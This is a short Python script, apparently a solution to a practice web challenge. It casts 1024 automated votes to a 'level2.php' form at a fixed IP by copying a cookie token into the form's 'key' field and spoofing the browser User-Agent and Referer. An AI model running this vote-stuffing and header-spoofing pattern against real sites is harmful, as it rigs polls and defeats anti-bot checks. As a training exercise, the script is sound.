#!/usr/bin/python3
import requests

URL = "http://158.69.76.135/level2.php"
s = requests.Session()
us_ag='Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36'
headers = {
    "User-Agent": us_ag,
    "Referer": "http://158.69.76.135/level2.php"
}
payload = {"id": "1324", 'holdthedoor': 'submit', "key":""}
for i in range(0, 1024):
    r = s.get('http://158.69.76.135/level2.php')
    fde=r.headers['set-cookie']
    inp=r.headers['set-cookie'].index("=")
    ind=r.headers['set-cookie'].index(";")
    payload["key"] = fde[(inp + 1):ind]
    r = s.post(URL, data=payload, headers=headers)
    if r.status_code == 200:
        print("vote nb {}".format(i))
    else:
        print("faile nb {}".format(i))
